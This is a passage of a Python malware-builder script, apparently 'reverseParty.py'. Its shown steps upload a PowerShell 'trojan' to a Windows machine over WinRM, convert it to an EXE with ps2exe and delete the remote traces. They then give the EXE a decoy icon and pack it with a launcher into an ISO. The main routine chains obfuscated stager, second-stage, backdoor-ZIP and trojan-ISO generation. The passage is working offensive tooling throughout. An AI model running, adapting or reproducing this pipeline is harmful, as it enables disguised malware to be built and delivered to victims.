      7c. Upload out/TROJANNAME via chunked base64 (CHUNK_SIZE=500, here-strings).
      7d. Run Invoke-ps2exe remotely.
      7e. Download resulting EXE to out/TROJANNAME.exe.
      7f. Clean up remote %TEMP% files.
    """
    section("STEP 7 — Trojan PS1 → EXE Conversion via WinRM")

    trojan_local     = os.path.join(OUT_DIR, TROJANNAME)
    trojan_exe_name  = TROJANNAME + ".exe"
    trojan_exe_local = os.path.join(OUT_DIR, trojan_exe_name)

    # 7a. Check pywinrm
    if not WINRM_AVAILABLE:
        err_nonfatal(
            "The 'pywinrm' library is not installed. "
            "Run: pip install pywinrm\n"
            f"  {RED_DARK}The Trojan EXE ({trojan_exe_name}) will NOT be generated. "
            f"Continuing...{RESET}"
        )
        return

    # 7b. Establish WinRM session
    info(f"Connecting to Windows machine at {WIN_IP} via WinRM (user: {WIN_USER})...")
    try:
        session = winrm.Session(
            f"http://{WIN_IP}:5985/wsman",
            auth=(WIN_USER, WIN_PASS),
            transport="ntlm",
            read_timeout_sec=30,
            operation_timeout_sec=25,
        )
        result = session.run_ps("$env:COMPUTERNAME")
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))
        hostname = result.std_out.decode(errors="replace").strip()
        ok(f"Connected to Windows machine: {hostname} ({WIN_IP})")
    except Exception as e:
        err_nonfatal(
            f"Could not connect to {WIN_IP} via WinRM: {e}\n"
            f"  {RED_DARK}The Trojan EXE ({trojan_exe_name}) will NOT be generated. "
            f"Continuing...{RESET}"
        )
        return

    # 7c. Upload TROJANNAME (chunked base64, CHUNK_SIZE=500, here-string encoding)
    info(f"Uploading '{TROJANNAME}' to Windows %TEMP% directory (chunked transfer)...")
    try:
        with open(trojan_local, "rb") as f:
            file_bytes = f.read()

        b64_full   = base64.b64encode(file_bytes).decode("ascii")
        CHUNK_SIZE = 500
        chunks     = [b64_full[i:i + CHUNK_SIZE]
                      for i in range(0, len(b64_full), CHUNK_SIZE)]
        remote_b64 = f"$env:TEMP\\{TROJANNAME}.b64"
        remote_dst = f"$env:TEMP\\{TROJANNAME}"

        info(f"  File size: {len(file_bytes):,} bytes  →  "
             f"{len(chunks)} chunk(s) of up to {CHUNK_SIZE} b64 chars each.")

        init_ps = (
            f"$chunk = @'\n{chunks[0]}\n'@\n"
            f"Set-Content -Path \"{remote_b64}\" -Value $chunk.Trim() -Encoding ASCII\n"
            f"Write-Output 'Chunk 1 OK'"
        )
        result = session.run_ps(init_ps)
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))

        for idx, chunk in enumerate(chunks[1:], start=2):
            append_ps = (
                f"$chunk = @'\n{chunk}\n'@\n"
                f"Add-Content -Path \"{remote_b64}\" -Value $chunk.Trim() -Encoding ASCII\n"
                f"Write-Output 'Chunk {idx} OK'"
            )
            result = session.run_ps(append_ps)
            if result.status_code != 0:
                raise RuntimeError(result.std_err.decode(errors="replace"))

        _bt_r = "`r"
        _bt_n = "`n"
        decode_ps = (
            f'$b64 = (Get-Content -Path "{remote_b64}" -Raw)'
            f' -replace "{_bt_r}",\'\' -replace "{_bt_n}",\'\';\n'
            f'$bytes = [System.Convert]::FromBase64String($b64);\n'
            f'[System.IO.File]::WriteAllBytes("{remote_dst}", $bytes);\n'
            f'Remove-Item "{remote_b64}" -Force -EA 0;\n'
            f"Write-Output 'Decode OK'"
        )
        result = session.run_ps(decode_ps)
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))

        ok(f"'{TROJANNAME}' uploaded to remote %TEMP% successfully "
           f"({len(chunks)} chunk(s) × {CHUNK_SIZE} b64 chars).")
    except Exception as e:
        err_nonfatal(
            f"Failed to upload '{TROJANNAME}' to {WIN_IP}: {e}\n"
            f"  {RED_DARK}The Trojan EXE ({trojan_exe_name}) will NOT be generated. "
            f"Continuing...{RESET}"
        )
        return

    # 7d. Run Invoke-ps2exe
    info(f"Running Invoke-ps2exe: {TROJANNAME} → {trojan_exe_name}...")
    try:
        convert_ps = (
            f"Invoke-ps2exe \"$env:TEMP\\{TROJANNAME}\" "
            f"\"$env:TEMP\\{trojan_exe_name}\";\n"
            f"if (Test-Path \"$env:TEMP\\{trojan_exe_name}\") "
            f"{{ Write-Output 'Conversion OK' }} "
            f"else {{ Write-Error 'EXE not created' }}"
        )
        result = session.run_ps(convert_ps)
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))
        ok(f"Invoke-ps2exe completed. Remote EXE: %TEMP%\\{trojan_exe_name}")
    except Exception as e:
        err_nonfatal(
            f"ps2exe conversion failed on {WIN_IP}: {e}\n"
            f"  {RED_DARK}Ensure ps2exe is installed on the Windows machine "
            f"(Install-Module ps2exe).\n"
            f"  The Trojan EXE ({trojan_exe_name}) will NOT be generated. "
            f"Continuing...{RESET}"
        )
        session.run_ps(f"Remove-Item \"$env:TEMP\\{TROJANNAME}\" -Force -EA 0")
        return

    # 7e. Download EXE
    info(f"Downloading '{trojan_exe_name}' from Windows %TEMP% to local out/ ...")
    try:
        download_ps = (
            f"$bytes = [System.IO.File]::ReadAllBytes(\"$env:TEMP\\{trojan_exe_name}\");\n"
            f"[System.Convert]::ToBase64String($bytes)"
        )
        result = session.run_ps(download_ps)
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))
        b64_exe   = result.std_out.decode(errors="replace").strip()
        exe_bytes = base64.b64decode(b64_exe)
        with open(trojan_exe_local, "wb") as f:
            f.write(exe_bytes)
        ok(f"EXE downloaded: {trojan_exe_local} ({len(exe_bytes):,} bytes)")
    except Exception as e:
        err_nonfatal(
            f"Failed to download '{trojan_exe_name}' from {WIN_IP}: {e}\n"
            f"  {RED_DARK}The Trojan EXE will NOT be available locally. "
            f"Continuing...{RESET}"
        )

    # 7f. Remote cleanup
    info("Cleaning up temporary files from Windows %TEMP%...")
    try:
        cleanup_ps = (
            f"Remove-Item \"$env:TEMP\\{TROJANNAME}\" -Force -EA 0;\n"
            f"Remove-Item \"$env:TEMP\\{trojan_exe_name}\" -Force -EA 0;\n"
            f"Write-Output 'Cleanup OK'"
        )
        session.run_ps(cleanup_ps)
        ok("Remote temporary files cleaned up.")
    except Exception:
        warn("Could not clean up temporary files on the Windows machine.")



# ==============================================================================
# STEP 8 — ISO CREATION
# ==============================================================================


def is_xorriso_installed():
    try:
        # Verify xorriso installation
        subprocess.run(["xorriso", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except FileNotFoundError:
        return False
    except subprocess.CalledProcessError:
        return False

def install_xorriso():
    info("Starting xorriso installation...")
    try:
        # Aggiorna prima l'indice dei pacchetti
        subprocess.run(["sudo", "apt", "update"], check=True)
        # Installa xorriso
        subprocess.run(["sudo", "apt", "install", "-y", "xorriso"], check=True)
        info("xorriso installed successfully!")
    except subprocess.CalledProcessError:
        info("Error installing xorriso. Check your permissions and internet connection.")
        sys.exit(1)


def step8_iso_creation():
    """
    STEP 8: Create an ISO file with:
    - TROJANNAME.exe renamed in EXENAME
    - LAUNCHENAME
    First of all ICONAME is injected in TROJANNAME.exe
    """
    section("STEP 8 — ISO creation")
    
    # Insert icon into TROJANNAME.exe
    info(f"Try to insert {ICONNAME} in {TROJANNAME}.exe")
    rcedit = os.path.join(STUFF_DIR, "rcedit-x64.exe")
    exe = os.path.join(OUT_DIR, TROJANNAME + ".exe")
    icon = os.path.join(STUFF_DIR, ICONNAME)
    try:
      cmd = [
        "wine",
        str(rcedit),
        str(exe),
        "--set-icon",
        str(icon)
      ]
      subprocess.run(cmd, check=True)
      info("icon inserted correctly")
    except Exception:
       warn(f"Could not insert icon in {TROJANNAME}.")

    
    # Create ISO
    if not is_xorriso_installed():
        install_xorriso()
    
    # --- Step 1: rinomina TROJANNAME + ".exe" in EXENAME ---
    exe = os.path.join(OUT_DIR, TROJANNAME + ".exe")
    exe_dest = os.path.join(OUT_DIR, EXENAME)
    if os.path.exists(exe_dest):
        os.remove(exe_dest)
    try:
        os.rename(exe, exe_dest)
    except Exception:
        warn(f"File {exe} not found.")

    try:
        # --- Step 2: creare cartella iso_appo ---
        iso_dir = os.path.join(OUT_DIR, "iso_appo")
        os.makedirs(iso_dir, exist_ok=True)
        # --- Step 3: copiare EXENAME e LAUNCHERNAME in iso_appo ---
        src = os.path.join(OUT_DIR, EXENAME)
        dest = os.path.join(iso_dir, EXENAME)      
        if not os.path.exists(src):
            raise FileNotFoundError(f"{src} file does not exist!")
        shutil.copy(src, dest)
        src = os.path.join(STUFF_DIR, LAUNCHERNAME)
        dest = os.path.join(iso_dir, LAUNCHERNAME)         
        if not os.path.exists(src):
            raise FileNotFoundError(f"{src} file does not exist!")
        shutil.copy(src, dest)  
    except Exception:
        warn(f"Problems preparing files to be inserted into the ISO container.")
  
    # --- Step 4: creare la ISO con xorriso ---
    iso_path = os.path.join(OUT_DIR, ISONAME)    
    try:
        cmd = [
            "xorriso",
            "-as",
            "mkisofs",
            "-R",
            "-J",            
            "-o",
            str(iso_path),
            str(iso_dir)
        ]
        info(f"cmd: {cmd}")
        subprocess.run(cmd, check=True)
    except Exception:
       warn(f"Could not create iso: {ISONAME}.")    
    info(f"ISO created: {iso_path}") 
 
    

# ==============================================================================
# MAIN
# ==============================================================================

def main():
    banner()
    step1_validate_variables()
    step2_obfuscate_second_stage()
    step3_obfuscate_stager()
    step4_convert_stager_to_exe()
    step5_create_zip()
    step6_obfuscate_trojan()
    step7_convert_trojan_to_exe()
    step8_iso_creation()

    section("ALL STEPS COMPLETED")
    ok("reverseParty.py finished successfully.")
    print()
    info(f"Output directory      : {OUT_DIR}")
    info(f"Second stage          : {os.path.join(OUT_DIR, SECONDNAME)}")
    info(f"Stager (PS1)          : {os.path.join(OUT_DIR, STAGERNAME)}")

    exe_path = os.path.join(OUT_DIR, EXENAME)
    if os.path.isfile(exe_path):
        info(f"Stager (EXE)          : {exe_path}")
    else:
        warn(f"Stager (EXE)          : not generated (see Step 4 output above)")

    zip_path = os.path.join(OUT_DIR, ZIPNAME)
    if os.path.isfile(zip_path):
        info(f"Backdoor ZIP          : {zip_path}")
    else:
        warn(f"Backdoor ZIP          : not generated (see Step 5 output above)")

    trojan_path = os.path.join(OUT_DIR, TROJANNAME)
    if os.path.isfile(trojan_path):
        info(f"Trojan (PS1)          : {trojan_path}")
    else:
        warn(f"Trojan (PS1)          : not generated (see Step 6 output above)")

    trojan_exe_path = os.path.join(OUT_DIR, ISONAME)
    if os.path.isfile(trojan_exe_path):
        info(f"Trojan (ISO)          : {trojan_exe_path}")
    else:
        warn(f"Trojan (ISO)          : not generated (see Step 7 output above)")

    print()


if __name__ == "__main__":
    main()
